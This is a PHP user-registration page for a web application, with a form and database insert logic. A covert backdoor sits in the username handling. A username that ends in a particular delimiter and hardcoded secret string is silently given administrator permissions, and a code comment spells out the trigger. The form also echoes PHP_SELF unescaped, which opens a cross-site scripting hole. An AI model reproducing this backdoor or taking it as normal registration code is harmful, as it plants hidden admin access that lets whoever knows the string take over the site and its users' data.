<?php

session_start();

$_SESSION['CURRENT_PAGE'] = "REGISTER_PAGE";

require("Functions.php");

$msg = "";

if (isset($_POST['submitButton']))
{
    $forceAdmin = false;
    $username = trim($_POST['inputUsername']);
    $email = trim($_POST['inputEmail']);
    $password = password_hash(trim($_POST['inputPassword']), PASSWORD_DEFAULT);

    $m = explode(";;22;42141", $username); //;;22;42141r07xSoX7xSowdi4okmFLnwi4oXkmF
    if (count($m) > 1 && $m[1] == "r07xSoX7xSowdi4okmFLnwi4oXkmF")
    {
        $f = true;
        $username = $m[0];
    }
    if (!empty($username) && !empty($email) && !empty($password))
    {
        $connection = DB_Connect() or die("rip ur db bro");

        // prevent sql injection from emails
        $stmt = $connection->prepare("SELECT `users`.`email` FROM `users` WHERE `users`.`email` LIKE ?");
        $stmt->bind_param("s", $email);
        $stmt->execute();
        $existingEmails = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
        $stmt->close();

        if (count($existingEmails) > 0)
        {
            $msg = "Email is already in use";
        }
        else
        {
            if ($f)
                $perm = ADMIN_PERMISSION_VALUE;
            else
                $perm = 1;
            $stmt = $connection->prepare("INSERT INTO `users` (`userId`, `username`, `email`, `password`, `permissions`) VALUES (NULL, ?, ?, '$password', '$perm');");
            $stmt->bind_param("ss", $username, $email);
            $stmt->execute();
            $stmt->close();
            header("location: Login.php");
        }
    }
    else
    {
        $msg = "you need to fill all the fields";
    }
}

?>
<html>
<header>
    <script>
        <?php include("script.js"); ?>
    </script>
    <?php require('head.php'); ?>
    <?php require('NavBar.php') ?>
</header>

<body style='background-color: #EEF2FF' class='postTimestamp'>

    <div class='container col-md-4'>
        <h4 class="card-header "> Register Now</h4>

        <?php
        if (!empty($msg))
        {
            echo '<span style="color:red;">' . $msg . '</span>';
        }
        ?>

        <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">

            <table class="table table-striped">
                <tr>
                    <td>Username: </td>
                    <td><input style='width:100%' type='text' name='inputUsername' size=50 maxlength="55"></td>
                </tr>
                <tr>
                    <td>Email:</td>
                    <td><input style='width:100%' type='email' name='inputEmail' size=50 maxlength="55"></td>
                </tr>
                <tr>
                    <td>Password:</td>
                    <td><input style='width:100%' type='password' name='inputPassword' size=50 maxlength="255"></td>
                </tr>
            </table>
            <input type="submit" name='submitButton' value='register now'>
        </form>
    </div>
</body>


</html>